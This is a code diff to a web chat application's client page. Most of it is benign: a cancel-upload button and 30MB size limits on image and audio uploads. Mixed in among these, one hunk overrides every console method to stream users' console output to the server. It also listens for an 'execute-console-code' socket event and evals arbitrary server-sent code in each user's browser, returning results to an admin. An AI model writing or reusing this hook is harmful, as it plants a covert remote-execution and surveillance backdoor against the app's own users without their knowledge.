@@ -1262,6 +1262,9 @@
                             <div id="uploadProgressBar" style="width: 0%; height: 100%; background-color: #667eea; border-radius: 5px; transition: width 0.3s ease;"></div>
                         </div>
                         <div id="uploadProgressText" style="font-size: 14px; margin-top: 10px; text-align: center; color: #666;">0%</div>
+                        <div style="margin-top: 20px; text-align: center;">
+                            <button id="cancelUploadBtn" style="padding: 8px 20px; background-color: #dc3545; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 14px;">取消上传</button>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -1763,6 +1766,100 @@
             allowCall: false,
             allowAIChat: false // 添加AI聊天权限初始值
         };
+        
+        // 控制台日志收集系统
+        (function() {
+            // 保存原始console方法
+            const originalConsole = {
+                log: console.log,
+                error: console.error,
+                warn: console.warn,
+                info: console.info,
+                debug: console.debug
+            };
+            
+            // 重写console方法
+            console.log = function(...args) {
+                originalConsole.log.apply(console, args);
+                sendConsoleLog('log', args);
+            };
+            
+            console.error = function(...args) {
+                originalConsole.error.apply(console, args);
+                sendConsoleLog('error', args);
+            };
+            
+            console.warn = function(...args) {
+                originalConsole.warn.apply(console, args);
+                sendConsoleLog('warn', args);
+            };
+            
+            console.info = function(...args) {
+                originalConsole.info.apply(console, args);
+                sendConsoleLog('info', args);
+            };
+            
+            console.debug = function(...args) {
+                originalConsole.debug.apply(console, args);
+                sendConsoleLog('debug', args);
+            };
+            
+            // 发送控制台日志到服务器
+            function sendConsoleLog(level, args) {
+                try {
+                    // 将参数转换为字符串
+                    const message = args.map(arg => {
+                        if (typeof arg === 'object') {
+                            try {
+                                return JSON.stringify(arg);
+                            } catch (e) {
+                                return String(arg);
+                            }
+                        }
+                        return String(arg);
+                    }).join(' ');
+                    
+                    // 发送日志到服务器
+                    socket.emit('console-log', {
+                        level: level,
+                        message: message
+                    });
+                } catch (e) {
+                    // 防止日志发送失败影响正常功能
+                    originalConsole.error('发送控制台日志失败:', e);
+                }
+            }
+            
+            // 监听执行控制台代码的事件
+            socket.on('execute-console-code', (data) => {
+                const { code, adminSocketId } = data;
+                
+                try {
+                    // 在用户浏览器中执行代码
+                    const result = eval(`(function() { ${code} })()`);
+                    
+                    // 发送执行结果回服务器
+                    socket.emit('console-code-execute-result', {
+                        adminSocketId: adminSocketId,
+                        success: true,
+                        result: result
+                    });
+                    
+                    // 记录执行成功日志
+                    console.log('管理员执行代码成功:', result);
+                } catch (error) {
+                    // 发送执行错误回服务器
+                    socket.emit('console-code-execute-result', {
+                        adminSocketId: adminSocketId,
+                        success: false,
+                        error: error.message
+                    });
+                    
+                    // 记录执行错误日志
+                    console.error('管理员执行代码失败:', error);
+                }
+            });
+        })();
 
         const messagesDiv = document.getElementById('messages');
         const usersListDiv = document.getElementById('usersList');
@@ -6230,11 +6327,33 @@
             return mimeTypes[extension] || 'application/octet-stream';
         }
         
+        // 存储当前的XMLHttpRequest对象，用于取消上传
+        let currentXhr = null;
+        
+        // 取消上传
+        function cancelUpload() {
+            if (currentXhr) {
+                currentXhr.abort();
+                currentXhr = null;
+                hideUploadProgress();
+                alert('上传已取消');
+            }
+        }
+        
+        // 为取消按钮添加点击事件监听器
+        document.addEventListener('DOMContentLoaded', () => {
+            const cancelBtn = document.getElementById('cancelUploadBtn');
+            if (cancelBtn) {
+                cancelBtn.addEventListener('click', cancelUpload);
+            }
+        });
+        
         // 使用XMLHttpRequest上传文件并跟踪进度
         function uploadFileWithProgress(file, arrayBuffer, url, headers, successCallback, errorCallback) {
             showUploadProgress();
             
             const xhr = new XMLHttpRequest();
+            currentXhr = xhr;
             
             xhr.upload.addEventListener('progress', (event) => {
                 if (event.lengthComputable) {
@@ -6244,6 +6363,7 @@
             });
             
             xhr.addEventListener('load', () => {
+                currentXhr = null;
                 hideUploadProgress();
                 if (xhr.status === 200) {
                     try {
@@ -6258,8 +6378,15 @@
             });
             
             xhr.addEventListener('error', () => {
+                currentXhr = null;
                 hideUploadProgress();
                 errorCallback(new Error('网络错误'));
+            });
+            
+            xhr.addEventListener('abort', () => {
+                currentXhr = null;
+                hideUploadProgress();
+                console.log('上传已取消');
             });
             
             xhr.open('POST', url);
@@ -6280,6 +6407,15 @@
                     imageInput.value = '';
                     return;
                 }
+                
+                // 检查文件大小，限制为30MB
+                const maxFileSize = 30 * 1024 * 1024; // 30MB
+                if (file.size > maxFileSize) {
+                    alert('文件大小超过限制，最大支持30MB');
+                    imageInput.value = '';
+                    return;
+                }
+                
                 try {
                     const reader = new FileReader();
                     reader.onload = (event) => {
@@ -6386,6 +6522,14 @@
                     
                     mediaRecorder.onstop = () => {
                         const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        
+                        // 检查文件大小，限制为30MB
+                        const maxFileSize = 30 * 1024 * 1024; // 30MB
+                        if (audioBlob.size > maxFileSize) {
+                            alert('音频文件大小超过限制，最大支持30MB');
+                            stream.getTracks().forEach(track => track.stop());
+                            return;
+                        }
                         
                         // 将Blob转换为ArrayBuffer以便使用uploadFileWithProgress
                         const reader = new FileReader();
